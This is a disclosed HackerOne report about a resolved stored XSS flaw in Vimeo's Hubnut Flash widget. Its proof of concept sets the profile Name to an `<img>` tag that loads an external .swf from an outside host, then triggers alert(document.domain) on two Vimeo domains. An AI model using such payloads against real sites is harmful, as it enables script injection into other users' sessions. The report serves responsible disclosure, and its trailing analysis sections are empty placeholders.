---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '87577'
original_report_id: '87577'
title: Stored XSS on vimeo.com and player.vimeo.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: vimeo
created_at: '2015-09-05T06:28:15.228Z'
disclosed_at: '2015-11-30T14:17:08.376Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Stored XSS on vimeo.com and player.vimeo.com

## Metadata

- HackerOne Report ID: 87577
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: vimeo
- Disclosed At: 2015-11-30T14:17:08.376Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

__Description__

You can share your uploaded videos using the widget Hubnut. The URL is something like https://player.vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slideshow=0&video_title=1&video_byline=1, and I noticed that the same content is loaded for this URL https://vimeo.com/hubnut/user/user36690798/uploaded_videos?color=44bbff&background=000000&slideshow=0&video_title=1&video_byline=1.
The problem is that the Flash file that shows the files uploaded by an user (https://f.vimeocdn.com/p/flash/hubnut/2.0.11/hubnut.swf) renders the Name of the owner of the video without escaping it. This allows to load an external Flash file using the `<img>` tag.

__Proof of concept__

1. Go to https://vimeo.com/settings.
2. Change your _Name_ to `<img src="//u00f1.xyz/xss.swf">`.
3. Click on _Save Changes_.
4. Go to https://vimeo.com/settings/profile.
5. Save, for future use, the editable value of the field _Vimeo URL_ (probably is like *user36690798*).
6. Go to https://player.vimeo.com/hubnut/user/[value_from_step_5] (like: https://player.vimeo.com/hubnut/user/user36690798).
7. `alert(document.domain)` is executed.
8. Go to https://vimeo.com/hubnut/user/[value_from_step_5] (like: https://vimeo.com/hubnut/user/user36690798).
9. `alert(document.domain)` is executed.

Please, let me know if something is not clear.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
